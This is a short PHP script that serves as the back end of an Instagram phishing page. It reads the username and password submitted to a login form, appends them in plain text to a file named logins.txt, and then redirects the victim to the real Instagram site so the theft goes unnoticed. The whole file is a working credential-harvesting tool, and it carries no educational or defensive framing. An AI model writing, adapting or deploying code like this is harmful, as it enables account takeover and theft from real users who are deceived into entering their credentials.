<?php
// Check if form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username and password from the POST request
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Create a string to save to the file
    $data = "Username: $username, Password: $password\n";

    // Save the data into a file called logins.txt
    $file = fopen("logins.txt", "a");
    fwrite($file, $data);
    fclose($file);

    // Redirect to Instagram
    header("Location: https://www.instagram.com/");
    exit(); // Make sure to exit after the redirect
}
?>
